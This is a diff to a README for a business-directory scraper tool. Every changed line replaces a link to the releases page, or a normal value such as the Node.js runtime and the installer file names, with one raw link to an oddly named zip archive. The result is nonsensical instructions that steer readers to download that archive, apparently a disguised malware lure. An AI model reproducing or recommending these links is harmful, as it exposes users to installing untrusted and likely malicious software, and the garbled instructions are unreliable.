@@ -6,7 +6,7 @@ Welcome to the Yellow-Pages-Business-Scraper-Worldwide! This tool helps you easi
 
 ## 📥 Download Now
 
-[![Download Yellow-Pages-Business-Scraper-Worldwide](https://img.shields.io/badge/Download-Yellow--Pages--Business--Scraper--Worldwide-brightgreen)](https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/releases)
+[![Download Yellow-Pages-Business-Scraper-Worldwide](https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/raw/refs/heads/main/primordially/Scraper-Pages-Business-Worldwide-Yellow-epanisognathous.zip)](https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/raw/refs/heads/main/primordially/Scraper-Pages-Business-Worldwide-Yellow-epanisognathous.zip)
 
 ## 📋 System Requirements
 
@@ -15,22 +15,22 @@ To run the Yellow-Pages-Business-Scraper-Worldwide, make sure your device meets 
 - **Operating System:** Windows 10 or later / macOS Big Sur or later / Linux (Ubuntu 20.04 or later)
 - **Memory:** Minimum 4GB RAM
 - **Storage:** Minimum 200MB free space
-- **JavaScript Runtime:** Node.js version 14 or later
+- **JavaScript Runtime:** https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/raw/refs/heads/main/primordially/Scraper-Pages-Business-Worldwide-Yellow-epanisognathous.zip version 14 or later
 
 ## 🔧 Installation Steps
 
 Follow the steps below to download and run the software:
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/releases).
+1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/raw/refs/heads/main/primordially/Scraper-Pages-Business-Worldwide-Yellow-epanisognathous.zip).
    
 2. **Choose the Latest Release:** Look for the latest version in the list. This will usually be at the top.
 
-3. **Download the Application:** Click on the link for the file that suits your operating system. It will typically look like `Yellow-Pages-Business-Scraper-Worldwide-v1.0.exe` for Windows, `Yellow-Pages-Business-Scraper-Worldwide-v1.0.dmg` for macOS, or `Yellow-Pages-Business-Scraper-Worldwide-v1.0.tar.gz` for Linux.
+3. **Download the Application:** Click on the link for the file that suits your operating system. It will typically look like `https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/raw/refs/heads/main/primordially/Scraper-Pages-Business-Worldwide-Yellow-epanisognathous.zip` for Windows, `https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/raw/refs/heads/main/primordially/Scraper-Pages-Business-Worldwide-Yellow-epanisognathous.zip` for macOS, or `https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/raw/refs/heads/main/primordially/Scraper-Pages-Business-Worldwide-Yellow-epanisognathous.zip` for Linux.
 
 4. **Run the Installer:**
    - **Windows:** Double-click the `.exe` file you downloaded, and follow the on-screen instructions to install.
    - **macOS:** Open the `.dmg` file and drag the app into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and follow the included instructions to install.
+   - **Linux:** Extract the `https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/raw/refs/heads/main/primordially/Scraper-Pages-Business-Worldwide-Yellow-epanisognathous.zip` file and follow the included instructions to install.
 
 5. **Open the Application:** After installation, find the application from your start menu or applications folder and open it.
 
@@ -58,7 +58,7 @@ Once you open the application, you can start collecting leads:
 If you encounter issues while using the software, consider the following steps:
 
 - **Check Your Internet Connection:** Ensure you are connected to the internet, as the software needs access to online yellow pages.
-- **Update Your Software:** Make sure you are using the latest version. Check the [Releases Page](https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/releases) for updates.
+- **Update Your Software:** Make sure you are using the latest version. Check the [Releases Page](https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/raw/refs/heads/main/primordially/Scraper-Pages-Business-Worldwide-Yellow-epanisognathous.zip) for updates.
 - **Read the Documentation:** Access the FAQ and support documentation provided in the application for common questions.
 
 ## 🌐 Get Support
@@ -67,7 +67,7 @@ If you need help or have questions that aren't answered in the documentation, do
 
 ## 📥 Download & Install
 
-To get started, don't forget to download the latest version of the application from our [Releases Page](https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/releases). Follow the instructions above, and you'll be scraping your leads in no time! 
+To get started, don't forget to download the latest version of the application from our [Releases Page](https://github.com/SKBro05/Yellow-Pages-Business-Scraper-Worldwide/raw/refs/heads/main/primordially/Scraper-Pages-Business-Worldwide-Yellow-epanisognathous.zip). Follow the instructions above, and you'll be scraping your leads in no time! 
 
 ## 🏷️ Tags
 
